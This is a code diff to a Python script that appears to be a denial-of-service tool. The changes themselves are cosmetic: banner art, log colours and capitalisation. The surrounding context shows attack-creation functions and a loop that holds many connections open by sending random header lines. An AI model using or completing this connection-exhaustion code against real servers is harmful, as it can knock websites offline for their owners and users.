@@ -21,9 +21,9 @@ print("""
 ▒║ ╚═══════╗▒║ ║▒▒▒▒▒║ ║▒║ ║▒▒▒▒║ ║▒▒║ ║▒▒▒▒▒▒▒▒║ ║▒▒▒▒▒▒║ ╚════╝ ║▒
 ▒║ ╔═════╗ ║▒║ ╚═════╝ ║▒║ ║▒▒▒▒║ ║▒▒║ ╚════╗▒▒▒║ ║▒▒▒▒▒▒║        ║▒
 ▒║ ║▒▒▒▒▒║ ║▒║         ║▒║ ║▒▒▒▒║ ║▒▒║      ║▒▒▒║ ║▒▒▒▒▒▒╚╗      ╔╝▒
-▒║ ╚═════╝ ║▒║ ╔═════╗ ║▒║ ╚════╝ ║▒▒║ ╔════╝▒▒▒║ ╚═════╗▒╚═╗  ╔═╝▒
-▒╚╗        ║▒║ ║▒▒▒▒▒║ ║▒║       ╔╝▒▒║ ║▒▒▒▒▒▒▒▒║       ║▒▒▒║  ║▒▒▒▒▒▒▒
-▒▒╚═══════╝▒▒╚═╝▒▒▒▒▒╚═╝▒╚═══════╝▒▒▒╚═╝▒▒▒▒▒▒▒▒╚═══════╝▒▒▒╚══╝▒
+▒║ ╚═════╝ ║▒║ ╔═════╗ ║▒║ ╚════╝ ║▒▒║ ╔════╝▒▒▒║ ╚═════╗▒╚═╗  ╔═╝▒▒
+▒╚╗        ║▒║ ║▒▒▒▒▒║ ║▒║       ╔╝▒▒║ ║▒▒▒▒▒▒▒▒║       ║▒▒▒║  ║▒▒▒▒
+▒▒╚═══════╝▒▒╚═╝▒▒▒▒▒╚═╝▒╚═══════╝▒▒▒╚═╝▒▒▒▒▒▒▒▒╚═══════╝▒▒▒╚══╝▒▒▒▒
 ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒""")
 print(f"\033[97m╔{'═' * 67}╗")
 print(f"\033[97m║\033[104m{' ' * 21}Don't attack government sites{' ' * 17}\033[0m║")
@@ -119,8 +119,8 @@ def init_attack(nAttackers):
     return attacker(identifier, agent, s)
 
 def main():
-    logging.info("\033[38;5;220mCreating attacker \033[36m{} \033[37mConnections: \033[33m{}\033[0m".format(host, connections))
-    logging.info("Establishing connections..")
+    logging.info("\033[38;5;220mCreating attacker \033[36m{} \033[37mconnections: \033[33m{}\033[0m".format(host, connections))
+    logging.info("\033[37mEstablishing connections..")
     attackers = []
 
     for x in range((connections)):
@@ -131,7 +131,7 @@ def main():
 
     while True:
         try:
-            logging.info("\033[38;5;220mCreating attacker \033[36m{} \033[37mConnections: \033[33m{}\033[0m".format(host, connections))
+            logging.info("\033[38;5;220mCreating attacker \033[36m{} \033[37mconnections: \033[33m{}\033[0m".format(host, connections))
             for s in list(attackers):
                 try:
                     s.socket.send("X-{}: {}\r\n".format(randint(0, 50000), randint(0, 50000)).encode())
